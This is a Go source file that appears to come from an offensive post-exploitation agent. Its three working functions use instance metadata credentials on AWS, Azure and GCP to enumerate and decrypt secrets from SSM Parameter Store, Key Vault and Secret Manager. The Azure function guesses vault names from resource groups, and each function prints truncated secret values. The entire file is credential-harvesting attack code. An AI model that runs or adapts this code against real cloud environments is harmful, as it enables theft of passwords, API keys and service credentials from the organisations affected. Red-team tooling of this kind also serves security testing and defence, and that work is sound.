package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

// awsGetSSMSecrets enumerates AWS SSM Parameter Store secrets via IMDS credentials.
// SSM parameters often contain database passwords, API keys, and service credentials.
func awsGetSSMSecrets(timeout time.Duration) string {
	var sb strings.Builder
	sb.WriteString("=== AWS SSM Parameter Store Secrets ===\n\n")

	// Get IMDS credentials
	h := awsHeaders(timeout)
	roles := metadataGet(awsCredsURL, timeout, h)
	if roles == "" {
		sb.WriteString("[-] No IAM role attached\n")
		return sb.String()
	}

	role := strings.TrimSpace(strings.Split(roles, "\n")[0])
	credsJSON := metadataGet(awsCredsURL+role, timeout, h)
	if credsJSON == "" {
		sb.WriteString("[-] Could not retrieve IAM credentials\n")
		return sb.String()
	}
	defer structs.ZeroString(&credsJSON)

	var creds struct {
		AccessKeyId     string `json:"AccessKeyId"`
		SecretAccessKey string `json:"SecretAccessKey"`
		Token           string `json:"Token"`
	}
	if err := json.Unmarshal([]byte(credsJSON), &creds); err != nil {
		sb.WriteString("[-] Could not parse IAM credentials\n")
		return sb.String()
	}
	defer func() {
		structs.ZeroString(&creds.AccessKeyId)
		structs.ZeroString(&creds.SecretAccessKey)
		structs.ZeroString(&creds.Token)
	}()

	sb.WriteString(fmt.Sprintf("[+] IAM Role: %s\n\n", role))

	// Detect region from instance metadata
	region := metadataGet(awsMetaURL+"placement/region", timeout, h)
	if region == "" {
		region = "us-east-1"
	}
	ssmEndpoint := fmt.Sprintf("https://ssm.%s.amazonaws.com/", region)

	// Enumerate parameters (DescribeParameters — lists all accessible parameters)
	describeParams := "Action=DescribeParameters&Version=2014-11-06&MaxResults=50"
	resp := awsSignedGet(ssmEndpoint, describeParams, creds.AccessKeyId, creds.SecretAccessKey, creds.Token, "ssm", timeout)
	if resp == "" {
		sb.WriteString("[-] SSM DescribeParameters failed (no permissions or no parameters)\n")
		return sb.String()
	}

	// SSM uses JSON API
	var descResult struct {
		Parameters []struct {
			Name             string `json:"Name"`
			Type             string `json:"Type"`
			Description      string `json:"Description"`
			LastModifiedDate float64 `json:"LastModifiedDate"`
		} `json:"Parameters"`
	}
	if err := json.Unmarshal([]byte(resp), &descResult); err != nil {
		// Try XML format (older API versions)
		names := cloudExtractXMLValues(resp, "Name")
		types := cloudExtractXMLValues(resp, "Type")
		if len(names) > 0 {
			sb.WriteString(fmt.Sprintf("[+] Found %d parameter(s):\n", len(names)))
			for i, name := range names {
				paramType := ""
				if i < len(types) {
					paramType = types[i]
				}
				sb.WriteString(fmt.Sprintf("  %s (type: %s)\n", name, paramType))
			}
		} else {
			sb.WriteString("[-] Could not parse SSM response\n")
		}
		return sb.String()
	}

	if len(descResult.Parameters) == 0 {
		sb.WriteString("[*] No SSM parameters found\n")
		return sb.String()
	}

	sb.WriteString(fmt.Sprintf("[+] Found %d parameter(s):\n\n", len(descResult.Parameters)))

	// Try to read each parameter value (GetParameter with WithDecryption)
	for _, param := range descResult.Parameters {
		sb.WriteString(fmt.Sprintf("  Name: %s (type: %s)\n", param.Name, param.Type))
		if param.Description != "" {
			sb.WriteString(fmt.Sprintf("  Desc: %s\n", param.Description))
		}

		// GetParameter with decryption
		getParams := fmt.Sprintf("Action=GetParameter&Version=2014-11-06&Name=%s&WithDecryption=true", param.Name)
		getResp := awsSignedGet(ssmEndpoint, getParams, creds.AccessKeyId, creds.SecretAccessKey, creds.Token, "ssm", timeout)
		if getResp != "" {
			var getResult struct {
				Parameter struct {
					Value string `json:"Value"`
				} `json:"Parameter"`
			}
			if err := json.Unmarshal([]byte(getResp), &getResult); err == nil && getResult.Parameter.Value != "" {
				val := getResult.Parameter.Value
				if len(val) > 200 {
					val = val[:200] + "..."
				}
				sb.WriteString(fmt.Sprintf("  Value: %s\n", val))
			} else {
				// Try XML
				if val := cloudExtractXMLValue(getResp, "Value"); val != "" {
					if len(val) > 200 {
						val = val[:200] + "..."
					}
					sb.WriteString(fmt.Sprintf("  Value: %s\n", val))
				} else {
					sb.WriteString("  Value: (access denied or parse error)\n")
				}
			}
		}
		sb.WriteString("\n")
	}

	return sb.String()
}

// azureGetKeyVaultSecrets enumerates Azure Key Vault secrets via managed identity.
func azureGetKeyVaultSecrets(timeout time.Duration) string {
	var sb strings.Builder
	sb.WriteString("=== Azure Key Vault Secrets ===\n\n")

	// Get managed identity token scoped to Key Vault
	tokenURL := azureMetadataBase + "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"
	tokenResp := metadataGet(tokenURL, timeout, map[string]string{"Metadata": "true"})
	if tokenResp == "" {
		sb.WriteString("[-] No managed identity available or Key Vault scope denied\n")
		return sb.String()
	}
	defer structs.ZeroString(&tokenResp)

	var tokenData struct {
		AccessToken string `json:"access_token"`
		ExpiresOn   string `json:"expires_on"`
	}
	if err := json.Unmarshal([]byte(tokenResp), &tokenData); err != nil {
		sb.WriteString("[-] Could not parse managed identity token\n")
		return sb.String()
	}
	defer structs.ZeroString(&tokenData.AccessToken)

	sb.WriteString("[+] Key Vault token acquired\n\n")

	authHeaders := map[string]string{"Authorization": "Bearer " + tokenData.AccessToken}

	// Detect vault names from instance tags or environment
	// Azure VMs often have tags or env vars pointing to vault names
	instanceResp := metadataGet(azureInstanceURL, timeout, map[string]string{"Metadata": "true"})
	var vaultNames []string
	if instanceResp != "" {
		var inst struct {
			Compute struct {
				ResourceGroupName string `json:"resourceGroupName"`
				SubscriptionId    string `json:"subscriptionId"`
				Tags              string `json:"tags"`
			} `json:"compute"`
		}
		if json.Unmarshal([]byte(instanceResp), &inst) == nil {
			// Check tags for vault references
			for _, tag := range strings.Split(inst.Compute.Tags, ";") {
				parts := strings.SplitN(tag, ":", 2)
				if len(parts) == 2 {
					lower := strings.ToLower(parts[0])
					if strings.Contains(lower, "vault") || strings.Contains(lower, "keyvault") {
						vaultNames = append(vaultNames, strings.TrimSpace(parts[1]))
					}
				}
			}
			// Try common naming conventions
			rg := inst.Compute.ResourceGroupName
			if rg != "" {
				vaultNames = append(vaultNames, rg+"-kv", rg+"-vault", rg+"-keyvault")
			}
		}
	}

	if len(vaultNames) == 0 {
		sb.WriteString("[*] No Key Vault names discovered from instance metadata.\n")
		sb.WriteString("    Specify vault name manually or check Azure resource tags.\n")
		return sb.String()
	}

	// Try each potential vault name
	for _, vaultName := range vaultNames {
		vaultURL := fmt.Sprintf("https://%s.vault.azure.net", vaultName)
		secretsURL := vaultURL + "/secrets?api-version=7.4"
		resp := metadataGet(secretsURL, timeout, authHeaders)
		if resp == "" || strings.Contains(resp, "error") {
			continue
		}

		var secretList struct {
			Value []struct {
				ID         string `json:"id"`
				Attributes struct {
					Enabled bool `json:"enabled"`
				} `json:"attributes"`
			} `json:"value"`
		}
		if err := json.Unmarshal([]byte(resp), &secretList); err != nil {
			continue
		}

		sb.WriteString(fmt.Sprintf("[+] Vault: %s — %d secret(s)\n", vaultName, len(secretList.Value)))

		for _, secret := range secretList.Value {
			// Extract secret name from ID URL
			parts := strings.Split(secret.ID, "/")
			name := parts[len(parts)-1]
			status := "enabled"
			if !secret.Attributes.Enabled {
				status = "disabled"
			}

			// Try to read the secret value
			secretURL := secret.ID + "?api-version=7.4"
			secretResp := metadataGet(secretURL, timeout, authHeaders)
			if secretResp != "" {
				var secretData struct {
					Value string `json:"value"`
				}
				if json.Unmarshal([]byte(secretResp), &secretData) == nil && secretData.Value != "" {
					val := secretData.Value
					if len(val) > 100 {
						val = val[:100] + "..."
					}
					sb.WriteString(fmt.Sprintf("  %s (%s): %s\n", name, status, val))
				} else {
					sb.WriteString(fmt.Sprintf("  %s (%s): (read denied)\n", name, status))
				}
			} else {
				sb.WriteString(fmt.Sprintf("  %s (%s): (read denied)\n", name, status))
			}
		}
		sb.WriteString("\n")
	}

	return sb.String()
}

// gcpGetSecretManager enumerates GCP Secret Manager secrets via metadata token.
func gcpGetSecretManager(timeout time.Duration) string {
	var sb strings.Builder
	sb.WriteString("=== GCP Secret Manager Secrets ===\n\n")

	// Get metadata service token
	tokenResp := metadataGet(gcpTokenURL, timeout, map[string]string{"Metadata-Flavor": "Google"})
	if tokenResp == "" {
		sb.WriteString("[-] No service account available\n")
		return sb.String()
	}
	defer structs.ZeroString(&tokenResp)

	var tokenData struct {
		AccessToken string `json:"access_token"`
		TokenType   string `json:"token_type"`
		ExpiresIn   int    `json:"expires_in"`
	}
	if err := json.Unmarshal([]byte(tokenResp), &tokenData); err != nil {
		sb.WriteString("[-] Could not parse service account token\n")
		return sb.String()
	}
	defer structs.ZeroString(&tokenData.AccessToken)

	sb.WriteString("[+] Service account token acquired\n\n")

	authHeaders := map[string]string{"Authorization": "Bearer " + tokenData.AccessToken}

	// Get project ID from metadata
	projectID := metadataGet(gcpProjectURL+"project-id", timeout, map[string]string{"Metadata-Flavor": "Google"})
	if projectID == "" {
		sb.WriteString("[-] Could not determine project ID\n")
		return sb.String()
	}
	sb.WriteString(fmt.Sprintf("[+] Project: %s\n\n", projectID))

	// List secrets
	secretsURL := fmt.Sprintf("https://secretmanager.googleapis.com/v1/projects/%s/secrets?pageSize=25", projectID)
	resp := metadataGet(secretsURL, timeout, authHeaders)
	if resp == "" {
		sb.WriteString("[-] Secret Manager API call failed (no permissions or API not enabled)\n")
		return sb.String()
	}

	var listResult struct {
		Secrets []struct {
			Name   string `json:"name"`
			Labels map[string]string `json:"labels"`
		} `json:"secrets"`
	}
	if err := json.Unmarshal([]byte(resp), &listResult); err != nil {
		sb.WriteString("[-] Could not parse Secret Manager response\n")
		return sb.String()
	}

	if len(listResult.Secrets) == 0 {
		sb.WriteString("[*] No secrets found in project\n")
		return sb.String()
	}

	sb.WriteString(fmt.Sprintf("[+] Found %d secret(s):\n\n", len(listResult.Secrets)))

	for _, secret := range listResult.Secrets {
		// Extract short name from full resource path
		parts := strings.Split(secret.Name, "/")
		shortName := parts[len(parts)-1]

		// Try to access the latest version
		versionURL := fmt.Sprintf("https://secretmanager.googleapis.com/v1/%s/versions/latest:access", secret.Name)
		versionResp := metadataGet(versionURL, timeout, authHeaders)
		if versionResp != "" {
			var accessResult struct {
				Payload struct {
					Data string `json:"data"` // base64 encoded
				} `json:"payload"`
			}
			if json.Unmarshal([]byte(versionResp), &accessResult) == nil && accessResult.Payload.Data != "" {
				decoded, err := base64.StdEncoding.DecodeString(accessResult.Payload.Data)
				if err == nil {
					val := string(decoded)
					if len(val) > 100 {
						val = val[:100] + "..."
					}
					sb.WriteString(fmt.Sprintf("  %s: %s\n", shortName, val))
				} else {
					sb.WriteString(fmt.Sprintf("  %s: (base64 decode error)\n", shortName))
				}
			} else {
				sb.WriteString(fmt.Sprintf("  %s: (access denied)\n", shortName))
			}
		} else {
			sb.WriteString(fmt.Sprintf("  %s: (access denied)\n", shortName))
		}
	}

	return sb.String()
}
